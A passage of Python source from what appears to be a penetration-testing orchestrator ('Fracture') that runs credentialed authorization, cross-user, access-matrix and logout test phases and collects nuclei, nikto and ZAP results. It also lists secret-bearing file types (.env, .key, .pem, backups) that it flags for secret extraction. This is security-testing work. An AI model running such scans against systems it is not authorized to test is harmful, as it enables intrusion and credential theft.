                                prompt_type="confirm",
                                options=["Yes", "No"],
                            ).strip().lower()
                            if _retest_ans in ("yes", "y", "1"):
                                _af_ev = str(_auth_status_path) if _auth_status_path.exists() else None
                                out.add_finding(
                                    title="Authentication Failure Detected",
                                    url=target["url"],
                                    port=target["port"],
                                    risk="HIGH",
                                    description=(
                                        f"Authentication for role {_retest_label} was not "
                                        f"verified during testing. Test results for this role "
                                        "may be incomplete or inaccurate. Re-run Fracture "
                                        "with valid credentials for this role."
                                    ),
                                    output=f"Role: {_retest_role}\nUser: {_retest_user}",
                                    output_file=_af_ev,
                                    affected="/",
                                    sources="fracture-auth",
                                    service=target["scheme"],
                                    owasp="A07:2025 Identification and Authentication Failures",
                                    nist="IA-2",
                                )
                        except Exception:
                            pass
        except Exception:
            pass

        # ── Post-context: privilege-escalation / cross-credential phases ───
        _scan_ctx["role"] = ""  # context loop complete; clear role tracker
        out._output_role  = ""  # post-context phases write to unroled paths
        if auth_sess and cfg.get("auth", {}).get("enabled"):
            _post_user = cfg.get("auth", {}).get("username", "").strip() or "authenticated"
            out.set_auth_context([{"username": _post_user, "role": "authenticated"}])
        else:
            out.set_auth_context([{"username": "UNAUTH", "role": "unauthenticated"}])

        def _skip(phase_name: str) -> bool:
            _check_pause()
            if not phases_enabled.get(phase_name, False):
                vc.log(f"[{phase_name}] Phase disabled — skipping", "INFO")
                vc.status(phase_name, phase_name, "skipped")
                pm.set_phase_status(phase_name, "skipped", phase_name)
                return True
            if pm.is_phase_complete(phase_name):
                vc.log(f"[{phase_name}] Already complete — skipping (checkpoint)", "INFO")
                return True
            return False

        effective_auth = auth_sess or sess

        # ── Phase 12: authorization ──
        if not _skip("authorization"):
            if not cfg["auth"].get("enabled"):
                vc.log("[authorization] auth not enabled — skipping", "WARNING")
                vc.status("authorization", "Authorization", "skipped")
                pm.set_phase_status("authorization", "skipped", "authorization")
            else:
                pm.set_phase_status("authorization", "running", "Authorization")
                try:
                    _phase_authorization(target, cfg, pm, out, effective_auth,
                                         _combined_auth_recon)
                    pm.set_phase_status("authorization", "complete", "Authorization")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase authorization error: {e}")
                    pm.set_phase_status("authorization", "error", detail=str(e))

        # ── Phase 15: cross_user ──
        if not _skip("cross_user"):
            if not cfg["auth"].get("enabled") or not cfg["auth2"].get("enabled"):
                vc.log("[cross_user] auth and/or auth2 not enabled — skipping", "WARNING")
                vc.status("cross_user", "Cross-User Testing", "skipped")
                pm.set_phase_status("cross_user", "skipped", "cross_user")
            elif not auth2_sess:
                vc.log("[cross_user] auth2 session could not be established — skipping",
                       "WARNING")
                vc.status("cross_user", "Cross-User Testing", "skipped")
                pm.set_phase_status("cross_user", "skipped", "cross_user")
            else:
                pm.set_phase_status("cross_user", "running", "Cross-User Testing")
                try:
                    _phase_cross_user(target, cfg, pm, out, effective_auth,
                                      auth2_sess, _combined_auth_recon)
                    pm.set_phase_status("cross_user", "complete", "Cross-User Testing")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase cross_user error: {e}")
                    pm.set_phase_status("cross_user", "error", detail=str(e))

        # ── Phase 20: access_matrix ──
        # Deduplicate crawl links accumulated across all contexts
        _seen_lnk: set = set()
        _dedup_links = [l for l in _all_crawl_links
                        if l not in _seen_lnk and not _seen_lnk.add(l)]
        if not _skip("access_matrix"):
            pm.set_phase_status("access_matrix", "running", "Access Matrix")
            try:
                # In multi-role mode _collected_roles is the authoritative role list;
                # overwrite auth_matrix in cfg so _phase_access_matrix uses correct labels.
                if _n_roles >= 1 and _collected_roles:
                    cfg["auth_matrix"] = [
                        {"role": r["role"], "username": r["username"], "password": r["password"]}
                        for r in _collected_roles
                    ]
                # Pass sessions already established in the context loop to avoid
                # re-authenticating every role a second time.
                _am_prebuilt = {
                    _c["label"]: _c["auth_sess"]
                    for _c in _cred_contexts
                    if _c["label"] != "unauthenticated" and _c["auth_sess"] is not None
                }
                _phase_access_matrix(target, cfg, pm, out, sess, {"links": _dedup_links},
                                     prebuilt_sessions=_am_prebuilt or None,
                                     landing_urls=_role_landing_urls)
                pm.set_phase_status("access_matrix", "complete", "Access Matrix")
                _save_checkpoint()
            except Exception as e:
                vc.error(f"Phase access_matrix error: {e}")
                pm.set_phase_status("access_matrix", "error", detail=str(e))

        # ── Phase 22: logout ──
        # Deliberately placed AFTER access_matrix so that concurrent session limit
        # testing (which re-authenticates with the same credentials) cannot disrupt
        # the pre-built sessions that access_matrix relies on.
        if not _skip("logout"):
            if not _completed_role_sessions:
                vc.log("[logout] No authenticated sessions completed — skipping", "WARNING")
                vc.status("logout", "Logout Testing", "skipped")
                pm.set_phase_status("logout", "skipped", "logout")
            else:
                pm.set_phase_status("logout", "running", "Logout Testing")
                try:
                    _phase_logout(target, cfg, pm, out,
                                  _completed_role_sessions, _all_crawl_links)
                    pm.set_phase_status("logout", "complete", "Logout Testing")
                    _save_checkpoint()
                except Exception as e:
                    vc.error(f"Phase logout error: {e}")
                    pm.set_phase_status("logout", "error", detail=str(e))

        # ── Collect background vulnscan results (nuclei + nikto) ─────────────
        # These were launched during the context loop and ran concurrently with
        # all subsequent phases.  Join now so their findings land in
        # findings.json before the summary counts them.
        if _vulnscan_handle is not None:
            _vs_key = f"vulnscan#{_vulnscan_ctx_label}" if _vulnscan_ctx_label else "vulnscan"
            try:
                _collect_vulnscan_bg(_vulnscan_handle)
                pm.set_phase_status(_vs_key, "complete", "Vuln Scan")
                _save_checkpoint()
            except Exception as e:
                vc.error(f"[vulnscan] Error collecting background results: {e}")
                out.log_error("vulnscan", "background collection", str(e))
                pm.set_phase_status(_vs_key, "error", detail=str(e))
            _vulnscan_handle = None

        # ── Collect ZAP results ──────────────────────────────────────────
        if _zap_handle is not None:
            try:
                _collect_zap_bg(_zap_handle)
                pm.set_phase_status(f"zap#{_ctx_label}", "complete", "ZAP Scan")
            except Exception as e:
                vc.error(f"[zap] Error collecting ZAP results: {e}")
                out.log_error("zap", "background collection", str(e))
                pm.set_phase_status(f"zap#{_ctx_label}", "error", detail=str(e))
            _zap_handle = None

        # Final checkpoint save before summary
        _save_checkpoint()

        # Write summary
        try:
            findings = json.loads(out.findings_json.read_text(encoding="utf-8"))
        except Exception:
            findings = []

        out.write_summary({
            "target": target["url"],
            "project": str(project_dir),
            "phases_run": [k for k, v in phases_enabled.items() if v],
            "checkpoint": pm.get_state(),
        })

        vc.log(f"Scan complete. Findings: {len(findings)}", "SUCCESS")
        vc.log(f"Output: {project_dir}", "INFO")

        # ── Incremental merge: copy this target's findings into root ─────
        # In multi-target mode each target writes to a per-host subdirectory.
        # Crucible reads from the ROOT findings.json, which wouldn't exist
        # until the final post-scan merge.  Incrementally updating the root
        # file after each target ensures findings are visible as they arrive.
        _root_proj_inc = Path(cfg["project"]).resolve()
        def _prefix_of(of_str, sub_prefix):
            if not of_str or not sub_prefix:
                return of_str
            of_str = of_str.strip()
            if of_str.startswith("["):
                try:
                    arr = json.loads(of_str)
                    for item in arr:
                        for key in ("req", "resp", "log", "path", "file"):
                            v = item.get(key, "")
                            if v and not v.startswith("/") and not v.startswith(sub_prefix + "/"):
                                item[key] = f"{sub_prefix}/{v}"
                    return json.dumps(arr)
                except (json.JSONDecodeError, TypeError):
                    return of_str
            parts = []
            for p in re.split(r"[,\n]", of_str):
                p = p.strip()
                if p and not p.startswith("/") and not p.startswith(sub_prefix + "/"):
                    p = f"{sub_prefix}/{p}"
                if p:
                    parts.append(p)
            return ",".join(parts)
        if project_dir != _root_proj_inc and findings:
            try:
                _root_fj_inc = _root_proj_inc / "findings.json"
                _root_fj_inc.parent.mkdir(parents=True, exist_ok=True)
                try:
                    _inc_sub = str(Path(project_dir).relative_to(_root_proj_inc))
                except ValueError:
                    _inc_sub = ""
                with threading.Lock():
                    _existing_root: list = []
                    if _root_fj_inc.exists():
                        try:
                            _existing_root = json.loads(
                                _root_fj_inc.read_text(encoding="utf-8"))
                        except Exception:
                            _existing_root = []
                    if not isinstance(_existing_root, list):
                        _existing_root = []
                    _seen_inc = {((_e.get("title") or "").lower(),
                                  (_e.get("ip") or "").lower(),
                                  int(_e.get("port") or 0))
                                 for _e in _existing_root}
                    _inc_count = 0
                    for _f in findings:
                        _fk = ((_f.get("title") or "").lower(),
                               (_f.get("ip") or "").lower(),
                               int(_f.get("port") or 0))
                        if _fk not in _seen_inc:
                            _seen_inc.add(_fk)
                            _fc = dict(_f)
                            _ofi = (_fc.get("output_file") or "").strip()
                            if _ofi and _inc_sub:
                                _fc["output_file"] = _prefix_of(_ofi, _inc_sub)
                            _existing_root.append(_fc)
                            _inc_count += 1
                    if _inc_count:
                        _tmp_inc = _root_fj_inc.with_suffix(".tmp")
                        _tmp_inc.write_text(
                            json.dumps(_existing_root, indent=2, default=str),
                            encoding="utf-8",
                        )
                        _tmp_inc.replace(_root_fj_inc)
                        vc.log(
                            f"[merge] Incremental: {_inc_count} finding(s) → root "
                            f"(total: {len(_existing_root)})", "INFO")
            except Exception as _inc_err:
                vc.error(f"[merge] Incremental merge failed: {_inc_err}")

        # Queue any in-scope redirect-discovered URLs for full scanning,
        # but only if the HOST is not already covered by an existing target.
        # Paths on already-targeted hosts are already tested by the host's
        # own scan phases — re-scanning them as new targets wastes resources.
        _covered_hosts = {
            urllib.parse.urlparse(u if "://" in u else "http://" + u).hostname.lower()
            for u in (*_pending_urls, *_processed_urls) if u
        }
        for _new_url in _in_scope_new:
            _norm_new = _new_url.rstrip("/")
            if _norm_new not in _processed_urls and _norm_new not in _pending_urls:
                _np = urllib.parse.urlparse(_norm_new)
                if _np.hostname and _np.hostname.lower() in _covered_hosts:
                    vc.log(
                        f"[redirect] Skipping path on already-targeted host: {_norm_new}",
                        "INFO",
                    )
                    continue
                _pending_urls.append(_norm_new)
                _redirect_discovered.add(_norm_new)
                if _np.hostname:
                    _covered_hosts.add(_np.hostname.lower())
                vc.log(
                    f"[redirect] Queued in-scope redirect target for scanning: {_norm_new}",
                    "INFO",
                )

        if not vc.managed:
            _tprint(f"\n{Fore.GREEN}[+] Scan complete!{Style.RESET_ALL}")
            _tprint(f"    Findings  : {len(findings)}")
            _tprint(f"    Output    : {project_dir}")
            _tprint(f"    JSON      : {out.findings_json}")
            _tprint(f"    CSV       : {out.findings_csv}")
            risk_counts: dict = {}
            for f in findings:
                r = (f.get("risk") or "INFO").upper()
                risk_counts[r] = risk_counts.get(r, 0) + 1
            for r in ("CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"):
                if risk_counts.get(r, 0):
                    colour = {
                        "CRITICAL": Fore.RED, "HIGH": Fore.RED,
                        "MEDIUM": Fore.YELLOW, "LOW": Fore.CYAN, "INFO": Fore.WHITE,
                    }.get(r, "")
                    _tprint(f"    {colour}{r:<10}{Style.RESET_ALL}: {risk_counts[r]}")
            _tprint()

    # ── Post-scan merge: fold host-specific findings into root ──────────────
    # When redirect-discovered targets produced findings in host subdirectories
    # (e.g. app-uat.client.example.com/findings.json), merge them into the root
    # findings.json so Crucible and Prometheus see the full set.
    _root_proj = Path(cfg["project"]).resolve()
    _root_fj   = _root_proj / "findings.json"
    try:
        _root_findings: list = json.loads(_root_fj.read_text(encoding="utf-8")) if _root_fj.exists() else []
        _merge_count = 0
        # Dedup key: (title_lower, ip_lower, port)
        _seen = set()
        for _rf in _root_findings:
            _seen.add(((_rf.get("title") or "").lower(),
                       (_rf.get("ip") or "").lower(),
                       int(_rf.get("port") or 0)))
        for _sub in sorted(_root_proj.iterdir()):
            if not _sub.is_dir():
                continue
            _sub_fj = _sub / "findings.json"
            if not _sub_fj.exists() or _sub_fj == _root_fj:
                continue
            try:
                _sub_findings = json.loads(_sub_fj.read_text(encoding="utf-8"))
                _sub_prefix = _sub.name
                for _sf in _sub_findings:
                    _key = ((_sf.get("title") or "").lower(),
                            (_sf.get("ip") or "").lower(),
                            int(_sf.get("port") or 0))
                    if _key not in _seen:
                        _seen.add(_key)
                        _of = (_sf.get("output_file") or "").strip()
                        if _of:
                            _sf["output_file"] = _prefix_of(_of, _sub_prefix)
                        _root_findings.append(_sf)
                        _merge_count += 1
            except Exception:
                pass
        if _merge_count:
            _root_fj.write_text(
                json.dumps(_root_findings, indent=2, default=str),
                encoding="utf-8",
            )
            vc.log(
                f"[merge] Merged {_merge_count} finding(s) from host "
                f"subdirectories into root findings.json "
                f"(total: {len(_root_findings)})", "SUCCESS")
    except Exception as _merge_err:
        vc.error(f"[merge] Failed to merge host findings: {_merge_err}")

    # ── Post-scan: cross-tool action items (Isotope) ─────────────────────
    _generate_cross_tool_action_items(_root_proj)

    if _pause_mgr is not None:
        _pause_mgr.write_stop_reason("completed", "all_phases_done")


def _generate_cross_tool_action_items(project_dir: Path) -> None:
    """Emit action items recommending Isotope for downloadable files found."""
    _ISOTOPE_FILE_PATTERNS = (
        ".bak", ".sql", ".gz", ".tar", ".zip", ".7z", ".rar",
        ".config", ".env", ".ini", ".key", ".pem", ".p12", ".pfx",
        ".dat", ".db", ".sqlite", ".mdb",
    )
    _ISOTOPE_TITLE_PATTERNS = (
        "backup", "export", "database", "dump",
        "sensitive file exposed", "config file",
    )
    fj = project_dir / "findings.json"
    aij = project_dir / "action_items.json"
    if not fj.exists():
        return
    try:
        findings = json.loads(fj.read_text(encoding="utf-8"))
    except Exception:
        return
    try:
        items = json.loads(aij.read_text(encoding="utf-8")) if aij.exists() else []
    except Exception:
        items = []
    seen = {(e.get("recommended_tool", "").lower(),
             e.get("target", "").lower(),
             e.get("title", "").strip().lower()) for e in items}

    added = 0
    for f in findings:
        title = f.get("title", "")
        title_l = title.lower()
        url = f.get("url", "") or f.get("affected", "")
        ip = f.get("ip", "")
        port = int(f.get("port", 0))
        hostname = f.get("hostname", "")
        output_file = f.get("output_file", "")
        if not url:
            continue
        is_file_match = any(ext in url.lower() for ext in _ISOTOPE_FILE_PATTERNS)
        is_title_match = any(pat in title_l for pat in _ISOTOPE_TITLE_PATTERNS)
        if not (is_file_match or is_title_match):
            continue
        key = ("isotope", (output_file or url).lower(), f"file analysis: {title_l}")
        if key in seen:
            continue
        seen.add(key)
        if not output_file or not Path(output_file).is_file():
            continue
        entry = {
            "id": str(_uuid.uuid4()),
            "type": "file_analysis",
            "recommended_tool": "Isotope",
            "target": output_file,
            "ip": ip,
            "port": port,
            "hostname": hostname,
            "title": f"File analysis: {title}",
            "description": (
                f"Fracture downloaded {url} to {output_file}. "
                f"Isotope can perform deep binary analysis including "
                f"secret extraction (API keys, connection strings, "
                f"private keys), string analysis, IOC detection, "
                f"and certificate inspection."
            ),
            "source_finding": title,
            "priority": "HIGH",
            "scope": "ext",
            "status": "pending",
            "datetime": datetime.now().isoformat(),
            "metadata": {"source_category": "fracture_file_discovery",
                          "source_url": url},
        }
        items.append(entry)
        vc.action_item(entry)
        added += 1

    if added:
        try:
            tmp = aij.with_suffix(".tmp")
            tmp.write_text(json.dumps(items, indent=2, default=str), encoding="utf-8")
            os.replace(str(tmp), str(aij))
        except Exception:
            try:
                aij.write_text(json.dumps(items, indent=2, default=str), encoding="utf-8")
            except Exception:
                pass
        vc.log(f"[cross-tool] {added} Isotope action item(s) generated", "SUCCESS")


if __name__ == "__main__":
    main()
